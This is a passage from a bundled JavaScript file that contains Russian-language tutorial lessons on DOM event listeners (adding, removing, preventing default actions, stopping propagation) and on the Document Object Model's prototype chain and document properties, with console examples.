элемента.\nЧисло посредников не ограничено.\n\n![](illustrations/event-2.png)\n\nМетоды добавления и удаления прослушивателей событий:\n\n![ico-20 green-ok] addEventListener\n![ico-20 green-ok] removeEventListener\n\nСвойства \"on...\" позволяют \"повесить\" только одного обработчика данного события на данный элемент.\n\neventListener-ов может быть сколько угодно для одного и того же элемента и одного и того же события.\n\nПредположим, мы вешаем обработчика события mousemove на все элементы **div**.\n\nЗатем вешаем \"персонального\" обработчика события **_~mousemove~_** на  **~div#sample~**.\n\nНа элементе **~div#sample~** \"сработают\" оба обработчика при наведении указателя мышки.\n\n_________________________________________________________________\n\n## ![ico-25 icon] addEventListener\n\nПервый аргумент метода addEventListener - это тип события ( строка ), например:\n^^• mouseover<br>• mouseout<br>• input<br>• change<br>**...**^^\n\nВторой аргумент - ссылка на функцию (обработчика события)\n\n_______________________\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\ndocument.getElementById('sample')\n  .addEventListener('click', function (event) {\n    console.log('sample click event:\\n', event)\n  })\n~~~\n\n______________________________\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nvar circle = document.body\n  .appendChild(document.createElement('div'))\ncircle.style = `\n  position: absolute;\n  top: 64px;\n  left: 64px;\n  width: 200px;\n  height: 200px;\n  border-radius: 50%;\n  background: #09b;\n  transition: all .5s;\n`\ncircle.addEventListener('click', function (event) {\n  event.target\n    .style\n    .background = Math.random() < 0.5 ? '#09b' : '#fa0'\n})\n\ncircle.addEventListener('click', function (event) {\n  event.target.style.top = Math.max(Math.random() * window.innerWidth - 200, 0)\n  event.target.style.left = Math.max(Math.random() * window.innerHeight - 200, 0)\n})\n~~~\n\nВ этом примере с помощью метода **~addEventListener~** мы назначаем два обрабочика события ~click~ элемента.\n\n{{{DOM-events-2.js}}}\n\n_______________________\n\nТретий (опциональный) формальный параметр метода **~addEventListener~** (логическое значение), по умолчанию имеет значение ~false~; будучи установленным в ~true~, позволяет перехватить событие на фазу погружения (**_capturing_**).\n\n_____________________________\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nvar btn = document.createElement('button')\nbtn.innerText = 'OK'\nbtn.style = `\n  background-image: url(https://cdn2.iconfinder.com/data/icons/user-23/512/User_Yuppie_2.png);\n  background-size: contain;\n  background-repeat: no-repeat;\n  background-position: left center;\n  padding: 5px 10px 5px 30px;\n`\ndocument.body.appendChild(btn)\n\nvar callback = event => console.log(`target: ${event.currentTarget.tagName} eventPhase: ${event.eventPhase}`)\n\nbtn.addEventListener('click', callback, true)\n\ndocument.body.addEventListener('click', callback, true)\n~~~\n\n{{{DOM-events-3.js}}}\n\n_________________________________________________\n\n### ![ico-20 icon] preventDefault()\n\nИногда мы не хотим, чтобы при наступлении события элемент HTML вел себя так, как он должен себя вести по умолчанию\n\nВ таком случае мы можем использовать метод **~preventDefault()~**\n\nНапример, по умолчанию в результате клика на гиперссылке происходит переход по адресу, указанному атрибутом *href*\n\nМы можем внутри обработчика события **_~click~_** элемента **~ a~** вызвать метод **_~preventDefault()~_**, что предотвратит поведение по умолчанию, и перехода не будет\n\n_______________________\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\nvar elem = document.body\n  .appendChild(document.createElement('a'))\n\nelem.innerText = 'click me'\n\nelem.href = 'https://www.w3schools.com/charsets/ref_utf_punctuation.asp'\n\nelem.addEventListener('click', function (event) {\n  event.preventDefault()\n  alert(`href: ${this.href}`)\n})\n~~~\n\n___________________________________\n\n### ![ico-20 icon] stopPropagation()\n\nПредотвращает \"всплытие\" события, т.е. срабатывание обработчиков этого события на элементах, внутри которых находится целевой элемент\n\nПочти все события \"всплывают\" ( но не все, например, событие **_focus_** не всплывает )\n\n__________________\n\nЗапустите код в консоли, кликните на самом маленьком кружке и посмотрите, что будет выведено в консоль\n\n◘◘![ico-25 cap] ** 5**◘◘\n~~~js\nvar elemData = {\n   name: 'div',\n   attrs: {\n     className: 'container',\n     title: 'Контейнер',\n     style: `\n       position: absolute;\n       top: 20px;\n       left: 20px;\n       border-radius: 50%;\n       border: dotted 2px #789;\n       background-color: #70ff9090;\n     `\n   }\n}\n\nfunction clickHandler (event) {\n  // event.stopPropagation()\n  console.info(this.num)\n}\n\nfunction insertElement (elemNum, parentElem = document.body) {\n   var elem = parentElem\n     .appendChild(document.createElement(elemData.name))\n   elem.num = elemNum\n\n   for (var attr in elemData.attrs) {\n     elem[attr] = elemData.attrs[attr]\n   }\n\n   elem.style.width = `${400 - elemNum * 50}px`\n   elem.style.height = `${400 - elemNum * 50}px`\n\n   elem.addEventListener('click', clickHandler)\n\n   return elem\n}\n\nvar elems = []\nelems [0] = insertElement(0)\nfor ( var x = 1; x < 5; x++ ) {\n  elems [x] = insertElement(x, elems[x - 1])\n}\n~~~\n\nТеперь перезагрузите страницу, опять вставьте код, но раскомментируйте строку\n\n~~~js\nevent.stopPropagation()\n~~~\n\nкликните на самом маленьком кружке и посмотрите, что будет выведено в консоль\n\n\n____________________________________\n\n### ![ico-20 icon] stopImmediatePropagation()\n\nЕсли у элемента есть несколько прослушивателей одного и того же события, они будут вызваны в том порядке, в котором они были добавлены\n\nЕсли один из обработчиков, установленных одним из этих listener-ов, вызовет метод **~event.stopImmediatePropagation()~**, то остальные listener-ы, следующие за ним, уже не сработают\n\n_______________________\n\nЕсли выполнить следующий код в консоли:\n\n◘◘![ico-25 cap] ** 6**◘◘\n\n~~~js\nvar elem = document.body\n  .appendChild(document.createElement('p'))\n\nelem.innerHTML = 'Click me, please'\n\nvar text = [\n  'I\\'m the first here, don\\'t pay attention for the rest!',\n  'Hello',\n  'are you happy?',\n  'what is your favorite language?',\n  'Bye'\n]\n\nfor (var txt of text) {\n  elem.addEventListener('click', (function (message) {\n    return function () {\n      // event.stopImmediatePropagation()\n      elem.innerHTML += `<br />${message}`\n    }\n  })(txt))\n}\n~~~\n\nто при клике на элементе сработают все прослушиватели собятия ~click~ элемента в той последовательности, в какой мы их определили\n\nОднако если убрать слеши перед строчкой\n\n~~~js\nevent.stopImmediatePropagation()\n~~~\n\nто сработает только один прослушиватель, и выведена в консоль будет только одна строчка\n\n____________________________________________\n\n## ![ico-25 icon] removeEventListener\n\nПрослушивателей событий желательно удалять перед удалением элемента\n\n^^Раньше прослушиватели удаленных элементов были причиной утечек памяти ( memory leaks ), поскольку Internet Explorer не умел обнаруживать такие ссылки^^\n^^каждый раз, когда наблюдатель добавлялся к элементу в IE, это приводило к утечке памяти^^\n^^По этой причине стало нормальной практикой явно удалять обработчиков перед удалением элементов или обнулять ссылки внутри наблюдателей^^\n\nПри удалении прослушивателя нужно передавать точно такие же аргументы, какие были переданы методу addEventListener при его создании\n\n^^В настоящее время современные браузеры ( включая IE и Microsoft Edge ) используют современные алгоритмы сбора мусора,^^\n^^которые могут обнаруживать таких прослушивателей событий для удаленных элементов^^\n^^Так что теперь не обязательно вызывать removeEventListener перед удалением элемента^^\n\n___________________\n\nТакой вариант удаления не сработает:\n\n◘◘![ico-25 cap] ** 7**◘◘\n\n~~~js\ndocument.getElementById('sample')\n  .addEventListener('click', function (event) {\n    console.log('sample click event:\\n', event)\n  })\n\ndocument.getElementById('sample')\n  .removeEventListener('click', function (event) {\n    console.log('sample click event: ', event)\n  })\n~~~\n\n___________________________________\n\nА такой - да:\n\n◘◘![ico-25 cap] ** 8**◘◘\n\n~~~js\nfunction clickHandler (event) {\n  this.innerHTML = '<small>My content was changed!</small>'\n}\nelem.addEventListener('click', clickHandler)\nelem.removeEventListener('click', clickHandler)\n~~~\n\n_________________________\n\n![ico-25 cap] ** 9**\n\n^^^[Разметка]\n\n~~~html\n<div id=\"main-frame\" class=\"wrapper\">\n  <div id=\"main-content\">\n    <div id=\"main-message\">\n      <h1>Event Listener</h1>\n      <p>Тестируем работу eventListener</p>\n      <div id=\"list\">\n         <p>Что нужно помнить:</p>\n         <ul class=\"single\">\n            <li>eventListener-ов нужно удалять</li>\n            <li>Для этого есть метод removeEventListener</li>\n         </ul>\n      </div>\n      <div class=\"error\">Error was detected</div>\n      <div id=\"diagnose\">Печалька</div>\n    </div>\n  </div>\n</div>\n\n<div id=\"error\">\n  <p id=\"details\">____________________</p>\n</div>\n~~~\n\n^^^\n\n^^^[Скрипт]\n\n~~~js\nvar collection = document.querySelectorAll('p &#126; *')\n\ncollection.forEach(x => {\n  if (x.nodeType === 1) {\n    x.addEventListener('mouseover', function (event) {\n      var message = event.target.tagName + event.target.id\n        ? '#' + event.target.id\n        : event.target.className\n          ? '.' + event.target.className\n          : ' content: ' + event.target.innerHTML\n\n      console.warn(message)\n    })\n  }\n})\n\nvar elem = document.querySelector('#list')\nelem.addEventListener('mouseover', function (event) {\n  event.target.innerHTML = `event: ${new Date().toLocaleString()}`\n})\n\nfunction clickHandler (event) {\n  this.innerHTML = '<small>My content was changed!</small>'\n}\n\nelem.addEventListener('click', clickHandler)\n~~~\n\n^^^\n\n_______________________________________________________\n\nОбратите внимание, что элемент в следущем примере создается только один раз\nПри удалении элемента ссылка на него сохраняется в переменной **elem**\nвместе со свойствами **onclick**, **onmouseover** и **onmouseout**,\nа при повторной вставке элемента в DOM все обработчики событий продолжают работать так же, как и до удаления\n\n◘◘![ico-25 cap] ** 9**◘◘\n\n~~~js\nvar elem = null\n\nfunction bodyClickHandler (event) {\n  if (elem) document.body.appendChild(elem)\n  else {\n    elem = document.body\n      .appendChild(document.createElement('div'))\n\n    elem.style = `\n      padding: 20px;\n      border: 2px solid #09b;\n    `\n    elem.onclick = function (event) {\n      event.stopPropagation()\n      elem = event.target.parentNode.removeChild(event.target)\n      document.body.onclick = bodyClickHandler\n    }\n\n    elem.onmouseover = function (event) {\n      event.target.style.borderColor = '#f50'\n      event.target.innerText = 'Welcome!'\n    }\n    elem.onmouseout = function ( event ) {\n      event.target.style.borderColor = '#09b'\n      event.target.innerText = 'Bye!'\n    }\n  }\n  document.body.onclick = null\n}\n\ndocument.body.onclick = bodyClickHandler\n~~~\n\n{{{DOM-events.js}}}\n\n____________________________________________________________\n\nПримеры в песочнице:\n\n[:::mouseover & mouseout:::](external/mouseover-mouseout)\n\n[:::mouseenter & mouseleave:::](external/mouseenter-mouseleave)\n\n[:::onscroll &#124; onwheel:::](external/onscroll-onwheel)\n\n[:::keypress vs keydown:::](external/keypress-keydown)\n\n[:::dispatchEvent:::](external/dispatch-event)\n\n_____________________________________________\n\n[![ico-30 hw] Упражнения](external/dom-events)\n\n___________________________\n\n[![ico-30 link] eventListener](external/w3-event-listener)\n"},68512:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Document Object Model (DOM)\n\nДавате разберемся, что же стоит за словами \"**Объектная модель документа**\".\n\nПервое: документ. Что это такое?\n\nВряд ли вы хотите погрузиться в дебри того, что из себя представляет документ для браузера.\n\nДля юзера браузер отрисовывает страницу, превращая в пиксели всю разметку, картинки, кнопки и т.д.\nИменно пиксели видит юзер, открывая вкладку браузера.\nТ.е. содержимое документа юзер видит как пиксели на экране монитора, из которых складывается изображение страницы.\n\n@@@@ 1\n![](images/users-see-pixels.svg)\n@@@@\n\nДля верстальщика документ - это тег **~&lt;html>~** со всем его содержимым.\n^^Верстальщик представляет себе, как браузер распарсит его разметку и стили, и как будет выглядеть страница, когда браузер отрисует пиксели на экране.^^\n\nЧто же такое документ для девелопера?\nТ.е. мы говорим не о том, чем на самом деле является документ и все элементы, которые в нем содержатся.\nМы говорим о модели, которую создает для нас браузер.\nО такой модели, которую может \"воспринимать\" **JS**, и с которой он сможет взаимодействовать.\n\n^^^[Модель]\n\n^^Представьте себе, что вы купили своему ребенку (или себе) маленькую модель полицейской машины.^^\n^^Конечно, это далеко не оригинал, но у нее тоже крутятся колеса и открываются дверцы.^^\n^^Однако эта модель не влияет на исходную машину. Т.е. когда вы крутите колеса или открываете дверцы модели, с оригинальной машиной ничего подобного не происходит.^^\n\n^^В случае объектной модели браузера или объектной модели документа все гораздо прикольнее.^^\n^^**То, что вы делаете с моделью, будет происходить с оригиналом**.^^\n\n^^^\n**JS** может оперировать ограниченным набором типов данных, которые мы уже изучили.\nИ, конечно, наиболее универсальным типом является **объект**.\nОбъект обладает свойствами и методами, большую часть которых он \"наследует\" от своих \"создателей\" (конструкторов в цепочке прототипов объекта).\nКаждый объект является **экземпляром**, созданным конкретным конструктором (который, в свою очередь, является объектом, а потому тоже является экземпляром, созданным конструктором).\nЦепочка прототипов экземпляра всегда заканчивается конструктором **~Object~**, который мы называем \"Адам\", поскольку это единственный объект, у которого нет конструктора, которым он был создан.\n\nДля нас браузер создает модель документа в виде объекта **~document~**.\n\nЧерез свойства и методы объекта **~document~** мы получаем доступ к возможностям браузера.\nТак браузер обеспечивает нам своеобразный **API** (Application Programming Interface) для доступа к его (браузера) сервисам, функционалу.\n\nИтак, объектная модель - это модель в виде объекта того, что на самом деле является чем-то гораздо более сложным, и с чем мы просто не смогли бы взаимодействовать, если бы не созданная для нас упрощенная модель.\n\n☼☼☼ Юзер видит пиксели, верстальщик - теги, а дев - объекты ☼☼☼\n\n_________________________________________\n\n## ![ico-30 icon] Цепочка прототипов\n\nКаждый объект является экземпляром, созданным каким-то конструктором.\n\n@@@@\n<br>Поскольку все элементы DOM и сам **~document~** являются для нас объектами, очевидно, что у них есть конструкторы, которыми эти объекты были созданы.<br>^^Скажем больше: ввиду сложности этих объектов там явно \"поработал\" не один конструктор, и стоит изучить цепочку прототипов различных хост-объектов, чтобы понимать, от какого общего корня они происходят, и в чем их \"генеалогические древа\" расходятся.^^\n![](images/object-constructor.svg)\n@@@@\n\n☼☼☼ Видишь объект - ищи конструктор ☼☼☼\n\nВоспользуемся рекурсивной функцией ~showProto~:\n\n◘◘ **showProto** ◘◘\n~~~js\nfunction showProto (elem) {\n  var proto = elem.__proto__\n  console.info(proto?.constructor.name || null)\n  proto && showProto(proto)\n}\n~~~\n\nдля получения цепочки прототипов объекта **~document~**:\n\n~~~js\nshowProto(document)\n~~~\n\nРезультат:\n\n◘◘^^~document~^^◘◘\n\n~~~console\nHTMLDocument\nDocument\nNode\nEventTarget\nObject\n~~~\n\nОбъект **~document~** включает две структурные части:\n\n^^• **document.head**^^\n^^• **document.body**^^\n\nЕсли применить функцию **_^^showProto^^_** к **~document.head~**:\n\n~~~js\nshowProto(document.head)\n~~~\n\nто мы получим такую цепочку протипов:\n\n◘◘^^~document.head~^^◘◘\n~~~console\nHTMLHeadElement\nHTMLElement\nElement\nNode\nEventTarget\nObject\n~~~\n\nПрименим функцию **_showProto_** к **~document.body~**:\n\n~~~js\nshowProto(document.body)\n~~~\n\nцепочка протипов будет такой:\n\n◘◘^^~document.body~^^◘◘\n~~~console\nHTMLBodyElement\nHTMLElement\nElement\nNode\nEventTarget\nObject\n~~~\n\nИтак, сравним цепочки прототипов:\n\n@@@@ 1\n![](illustrations/DOM-prototype-chain.svg)\n@@@@\n\n@@@@\nи обнаружим, что:<br><br>![ico-20 warn] При движении вглубь по цепочке прототипов в самом конце мы всегда обнаруживаем **Object**.<br>![ico-20 warn] У каждого элемента DOM в цепочке прототипов мы находим конструкторы **EventTarget** и **Node**.<br>![ico-20 warn] И мы обнаружили, что все html-элементы наследуют от конструктора **HTMLElement**.\n![](images/object-adam.svg)\n@@@@\n\nЭти объекты (**~document~**, **~document.head~**, **~document.body~**) **не** являются для нас нативными (\"родными\"), поскольку созданы внешними конструкторами, большинство из которых мы даже не можем вызвать с ключевым словом **~new~**.\n\nНапример, попробуйте выполнить такой код:\n\n~~~js\nnew HTMLElement()\n~~~\n\nи вы увидите в консоли сообщение:\n\n~~~error\n    Uncaught TypeError: Illegal constructor\n~~~\n\nПоэтому мы их будем называть **хост-объекты** (host-объекты), т.е. объекты внешней среды (host), в которой функционирует наш скрипт.\nДля нас они как \"инопланетяне\", которых мы видим как объекты, но которые, по своей истинной сути, объектами не являются.\n\nВ консоли браузера этих \"инопланетян\" (элементы DOM) мы будем видеть по-разному в зависимости от того, используем ли мы **~console.log~** или **~console.dir~**.\nЕсли мы воспользуемся методом **~console.log~**, то мы увидим их в консоли такими же, какими мы видим их во вкладке **Elements** консоли браузера.\n\n~~~js\nconsole.log(document)\n~~~\n\n~~~console\n▼ #document (about:blank#)\n  &lt;html>\n    &lt;head>&lt;/head>\n    &lt;body>&lt;/body>\n  &lt;/html>\n~~~\n\n**~console.dir~** будет показывать их нам как объекты, т.е. отображать нам модель, созданную браузером специально для нас.\n\n~~~js\nconsole.dir(document)\n~~~\n\n~~~~console\n▼ #document\n  ► location: Location {ancestorOrigins: DOMStringList, href: 'about:blank#', origin: 'null', protocol: 'about:', host: '', …}\n    URL: \"about:blank#\"\n  ► activeElement: body\n  ► adoptedStyleSheets: Proxy(Array) {}\n    alinkColor: \"\"\n  ► all: HTMLAllCollection(3) [html, head, body]\n  ► anchors: HTMLCollection []\n  ► applets: HTMLCollection []\n    baseURI: \"about:blank#\"\n    bgColor: \"\"\n  ► body: body\n    characterSet: \"UTF-8\"\n    charset: \"UTF-8\"\n    childElementCount: 1\n  ► childNodes: NodeList [html]\n  ► children: HTMLCollection [html]\n    compatMode: \"BackCompat\"\n    contentType: \"text/html\"\n    cookie: (...)\n    currentScript: null\n  ► defaultView: Window {window: Window, self: Window, document: document, name: '', location: Location, …}\n    designMode: \"off\"\n    dir: \"\"\n    doctype: null\n  ► documentElement: html\n    documentURI: \"about:blank#\"\n    domain: \"\"\n  ► embeds: HTMLCollection []\n  ► featurePolicy: FeaturePolicy {}\n    fgColor: \"\"\n  ► firstChild: html\n  ► firstElementChild: html\n  ► fonts: FontFaceSet {onloading: null, onloadingdone: null, onloadingerror: null, ready: Promise, status: 'loaded', …}\n  ► forms: HTMLCollection []\n  ► fragmentDirective: FragmentDirective {}\n    fullscreen: false\n    fullscreenElement: null\n    fullscreenEnabled: true\n  ► head: head\n    hidden: false\n  ► images: HTMLCollection []\n  ► implementation: DOMImplementation {}\n    inputEncoding: \"UTF-8\"\n    isConnected: true\n  ► lastChild: html\n  ► lastElementChild: html\n    lastModified: \"10/05/2024 11:42:37\"\n    linkColor: \"\"\n  ► links: HTMLCollection []\n    nextSibling: null\n    nodeName: \"#document\"\n    nodeType: 9\n    nodeValue: null\n    onabort: null\n    onanimationend: null\n    onanimationiteration: null\n    onanimationstart: null\n    onauxclick: null\n    onbeforecopy: null\n    onbeforecut: null\n    onbeforeinput: null\n    onbeforematch: null\n    onbeforepaste: null\n    onbeforetoggle: null\n    onbeforexrselect: null\n    onblur: null\n    oncancel: null\n    oncanplay: null\n    oncanplaythrough: null\n    onchange: null\n    onclick: null\n    onclose: null\n    oncontentvisibilityautostatechange: null\n    oncontextlost: null\n    oncontextmenu: null\n    oncontextrestored: null\n    oncopy: null\n    oncuechange: null\n    oncut: null\n    ondblclick: null\n    ondrag: null\n    ondragend: null\n    ondragenter: null\n    ondragleave: null\n    ondragover: null\n    ondragstart: null\n    ondrop: null\n    ondurationchange: null\n    onemptied: null\n    onended: null\n    onerror: null\n    onfocus: null\n    onformdata: null\n    onfreeze: null\n    onfullscreenchange: null\n    onfullscreenerror: null\n    ongotpointercapture: null\n    oninput: null\n    oninvalid: null\n    onkeydown: null\n    onkeypress: null\n    onkeyup: null\n    onload: null\n    onloadeddata: null\n    onloadedmetadata: null\n    onloadstart: null\n    onlostpointercapture: null\n    onmousedown: null\n    onmouseenter: null\n    onmouseleave: null\n    onmousemove: null\n    onmouseout: null\n    onmouseover: null\n    onmouseup: null\n    onmousewheel: null\n    onpaste: null\n    onpause: null\n    onplay: null\n    onplaying: null\n    onpointercancel: null\n    onpointerdown: null\n    onpointerenter: null\n    onpointerleave: null\n    onpointerlockchange: null\n    onpointerlockerror: null\n    onpointermove: null\n    onpointerout: null\n    onpointerover: null\n    onpointerrawupdate: null\n    onpointerup: null\n    onprerenderingchange: null\n    onprogress: null\n    onratechange: null\n    onreadystatechange: null\n    onreset: null\n    onresize: null\n    onresume: null\n    onscroll: null\n    onscrollend: null\n    onscrollsnapchange: null\n    onscrollsnapchanging: null\n    onsearch: null\n    onsecuritypolicyviolation: null\n    onseeked: null\n    onseeking: null\n    onselect: null\n    onselectionchange: null\n    onselectstart: null\n    onslotchange: null\n    onstalled: null\n    onsubmit: null\n    onsuspend: null\n    ontimeupdate: null\n    ontoggle: null\n    ontransitioncancel: null\n    ontransitionend: null\n    ontransitionrun: null\n    ontransitionstart: null\n    onvisibilitychange: null\n    onvolumechange: null\n    onwaiting: null\n    onwebkitanimationend: null\n    onwebkitanimationiteration: null\n    onwebkitanimationstart: null\n    onwebkitfullscreenchange: null\n    onwebkitfullscreenerror: null\n    onwebkittransitionend: null\n    onwheel: null\n    ownerDocument: null\n    parentElement: null\n    parentNode: null\n    pictureInPictureElement: null\n    pictureInPictureEnabled: true\n  ► plugins: HTMLCollection []\n    pointerLockElement: null\n    prerendering: false\n    previousSibling: null\n    readyState: \"complete\"\n    referrer: \"\"\n    rootElement: null\n  ► scripts: HTMLCollection []\n  ► scrollingElement: body\n  ► styleSheets: StyleSheetList {length: 0}\n    textContent: null\n  ► timeline: DocumentTimeline {currentTime: 580619.35, duration: null}\n    title: \"\"\n    visibilityState: \"visible\"\n    vlinkColor: \"\"\n    wasDiscarded: false\n    webkitCurrentFullScreenElement: null\n    webkitFullscreenElement: null\n    webkitFullscreenEnabled: true\n    webkitHidden: false\n    webkitIsFullScreen: false\n    webkitVisibilityState: \"visible\"\n    xmlEncoding: null\n    xmlStandalone: false\n    xmlVersion: null\n  ► [[Prototype]]: HTMLDocument\n~~~~\n______________________\n\n## ![ico-30 icon] Свойства объекта document\n\nРазберем содержимое объекта **~document~** \"по косточкам\".\n![ico-20 warn] ^^Для этого нужно открыть любую страницу, потому что далее мы будем итерировать свойства объекта **~document~**, а у него есть свойство **~cookie~**, которое недоступно на пустой странице (~about:blank~).^^\n\n### ![ico-25 icon] HTMLElement\n\n\"Вытянем\" из объекта **~document~** все свойства, являющиеся экземплярами конструктора **HTMLElement**:\n\n~~~js\nfor (var prop in document) {\n  document[prop] &&\n    document[prop] instanceof HTMLElement &&\n    console.log(`${prop}: HTMLElement`)\n}\n~~~\n\n◘◘^^**HTMLElement**^^◘◘\n\n~~~console\ndocumentElement: HTMLElement\nbody: HTMLElement\nhead: HTMLElement\nscrollingElement: HTMLElement\nfirstElementChild: HTMLElement\nlastElementChild: HTMLElement\nactiveElement: HTMLElement\nlastChild: HTMLElement\n~~~\n\n_______________________________________\n\n### ![ico-25 icon] HTMLCollection vs NodeList\n\nТеперь посмотрим, какие свойства документа являются ссылками на экземпляры конструкторов **HTMLCollection** и **NodeList**:\n\n~~~js\n;['HTMLCollection', 'NodeList']\n  .forEach(constructorName => {\n    for (var prop in document) {\n      document[prop] &&\n        document[prop] instanceof window[constructorName] &&\n        console.log(`${prop}: ${constructorName}`)\n    }\n  })\n~~~\n\n◘◘^^**Результат**^^◘◘\n~~~console\nimages: HTMLCollection\nembeds: HTMLCollection\nplugins: HTMLCollection\nlinks: HTMLCollection\nforms: HTMLCollection\nscripts: HTMLCollection\nanchors: HTMLCollection\napplets: HTMLCollection\nchildren: HTMLCollection\nchildNodes: NodeList\n~~~\n\nОткройте любую страницу и в консоли открытой вкладки выполните код:\n\n◘◘![ico-25 coffee] **^^document.scripts^^**◘◘\n~~~js\nfor (var script of document.scripts) {\n  console.log(script.innerText)\n}\n~~~\n\n◘◘![ico-25 coffee] **^^document.styleSheets^^**◘◘\n~~~js\nfor (var sheet of document.styleSheets) {\n  for (var rule of sheet.cssRules) {\n    console.warn(rule.selectorText)\n    console.info(rule.cssText)\n  }\n}\n~~~\n\nЭкземпляры конструкторов **HTMLCollection** и **NodeList** являются итерабельными объектами, в первом случае элементами итерабельного объекта класса **HTMLCollection** являются html-элементы, а во втором - узлы дерева DOM.\n\n◘◘![ico-25 coffee] **^^HTMLCollection / NodeList^^**◘◘\n~~~js\nfunction test (hostObject) {\n  var res = {}\n  for (var key in hostObject) {\n    (hostObject[key] instanceof NodeList || hostObject[key] instanceof HTMLCollection) &&\n    Object.assign(res, {\n      [key]: hostObject[key].__proto__.constructor.name\n    })\n  }\n  return res\n}\n\nconsole.log(test(document.body))\n~~~\n\n~~~console\n▼ {children: 'HTMLCollection', childNodes: 'NodeList'}\n  ► childNodes: \"NodeList\"\n  ► children: \"HTMLCollection\"\n  ► [[Prototype]]: Object\n~~~\n\n_____________________________________________\n\n![ico-30 coffee] Чтобы понять главное отличие **HTMLCollection** от **NodeList**, рассмотрим пример.\n\nПусть во вкладке **Elements** консоли браузера у нас такая картинка:\n\n~~~html\n&lt;html>\n  &lt;head>&lt;/head>\n  &lt;body>\n    Hello!\n    &lt;section>&lt;/section>\n    &lt;p>Students&lt;/p>\n    &lt;!-- Comment --\x3e\n  &lt;/body>\n&lt;/html>\n~~~\n\nПосле выполнения такого кода:\n\n~~~js\nconsole.log(document.body.children)\n~~~\n\nмы увидим в консоли **HTMLCollection**:\n\n~~~console\n▼ HTMLCollection(2) [section, p]\n  ► 0: section\n  ► 1: p\n    length: 2\n  ► [[Prototype]]: HTMLCollection\n~~~\n\nА после выполнения кода:\n\n~~~js\nconsole.log(document.body.childNodes)\n~~~\n\nмы увидим в консоли **NodeList**:\n\n~~~console\n▼ NodeList(7) [text, section, text, p, text, comment, text]\n  ► 0: text\n  ► 1: section\n  ► 2: text\n  ► 3: p\n  ► 4: text\n  ► 5: comment\n  ► 6: text\n    length: 7\n  ► [[Prototype]]: NodeList\n~~~\n\n______________________________________________________\n\n### ![ico-25 icon] Strings\n\n~~~js\nfunction getStrings (hostObject) {\n  var res = {}\n  for (const prop in hostObject) {\n    typeof hostObject[prop] === 'string' &&\n      Object.assign(res, {\n        [prop]: hostObject[prop].__proto__.constructor.name\n      })\n  }\n  return res\n}\n\nconsole.log(getStrings(document))\n~~~\n\n~~~console\n▼ {URL: 'String', documentURI: 'String', compatMode: 'String', characterSet: 'String', charset: 'String', …}\n    URL: String\n    alinkColor: String\n    baseURI: String\n    bgColor: String\n    characterSet: String\n    charset: String\n    compatMode: String\n    contentType: String\n    cookie: String\n    designMode: String\n    dir: String\n    documentURI: String\n    domain: String\n    fgColor: String\n    inputEncoding: String\n    lastModified: String\n    linkColor: String\n    nodeName: String\n    readyState: String\n    referrer: String\n    title: String\n    visibilityState: String\n    vlinkColor: String\n    webkitVisibilityState: String\n  ► [[Prototype]]: Object\n~~~\n\n______________________________________________________\n\n### ![ico-25 icon] Other objects\n\nС помощью функции **~getObjects~** найдем в объекте **~document~** все свойства, являющиеся объектами, но не являющихся экземплярами конструкторов **HTMLElement**, **HTMLCollection** и **NodeList**, а так же не являющихся методами объекта **~document~**:\n\n~~~js\nfunction getObjects () {\n  var res = {}\n  for (var key in document) {\n    !(document[key] instanceof NodeList ||\n    document[key] instanceof HTMLCollection ||\n    document[key] instanceof HTMLElement ||\n    typeof document[key] === 'function') &&\n    document[key] instanceof Object &&\n    Object.assign(res, {\n      [key]: document[key].__proto__.constructor.name\n    })\n  }\n  return res\n}\n\nconsole.log(getObjects())\n~~~\n\n◘◘^^**Result**^^◘◘\n~~~console\n▼ {location: 'Location', implementation: 'DOMImplementation', doctype: 'DocumentType', defaultView: 'Window', all: 'HTMLAllCollection', …}\n  adoptedStyleSheets: \"Array\"\n  all: \"HTMLAllCollection\"\n  defaultView: \"Window\"\n  doctype: \"DocumentType\"\n  featurePolicy: \"FeaturePolicy\"\n  firstChild: \"DocumentType\"\n  fonts: \"EventTarget\"\n  fragmentDirective: \"FragmentDirective\"\n  implementation: \"DOMImplementation\"\n  location: \"Location\"\n  styleSheets: \"StyleSheetList\"\n  timeline: \"DocumentTimeline\"\n~~~\n\n_________________________________________________\n\n### ![ico-25 icon] Event handlers\n\nГлавное отличие хост-объектов от нативных объектов JS заключается в способности реагировать на события.\nНе трудно догадаться, что такая способность обеспечивается конструктором **EventTarget**, название которого говорит само за себя.\nОно означает, что объект, созданный этим конструктором, является целью, или \"мишенью\" для событий.\nИными словами, в жизни этого объекта могут происходить события, и у него заложена способность реагировать на эти события.\n\n^^На самом деле реагировать на события будет браузер, и весь механизм \"передачи\" этих событий хост-объектам осуществляется в нашей хост-среде, или глобальном объекте - браузере.^^\nУ хост-объектов предусмотрены для этого специальные свойства, имена которых начинаются с приставки \"**~on~**\"\n^^(по умолчанию значениями этих свойств будет ~null~).^^\n\nПолучить список таких свойств вы можете, запустив в консоли любой страницы код:\n\n~~~js\nfunction getEventHandlers (hostObject) {\n  for (const prop in hostObject) {\n    !prop.indexOf('on') && console.log(prop)\n  }\n}\n\ngetEventHandlers(document)\n~~~\n\nЧуть позже мы будем подробнее изучать события, но сейчас нам достаточно понять, что любой хост-объект в своей цепочке прототипов имеет конструктор **EventTarget**, что обеспечивает его способность реагировать на события, и имеет перечень стандартных событий, доступ к которым для нас обеспечивает набор свойств, начинающихся с приставки \"**~on~**\".\n\nЕсли откинуть приставку **~on~**, то останется **тип события** хост-объекта.\n\nЕсли мы хотим, чтобы при наступлении события из списка запускалась какая-то функция, нужно ссылку на эту функцию сделать значением соответствующего свойства:\n\n~~~js\ndocument.body.onclick = console.log\n~~~\n\n^^Например, поместите в свойство **~onscroll~** объекта ~document~ ссылку на функцию **~console.log~**:^^\n\n~~~js\ndocument.onscroll = console.log\n~~~\n\nи прокрутите страницу.\nВ результате вы увидите в консоли объект события, который получила функция **~console.log~** в качестве аргумента при вызове:\n\n◘◘ **^^result^^** ◘◘\n\n~~~console\n▼ Event {isTrusted: true, type: 'scroll', target: document, currentTarget: document, eventPhase: 2, …}\n    isTrusted: true\n    bubbles: true\n    cancelBubble: false\n    cancelable: false\n    composed: false\n    currentTarget: null\n    defaultPrevented: false\n    eventPhase: 0\n    returnValue: true\n  ► srcElement: document\n  ► target: 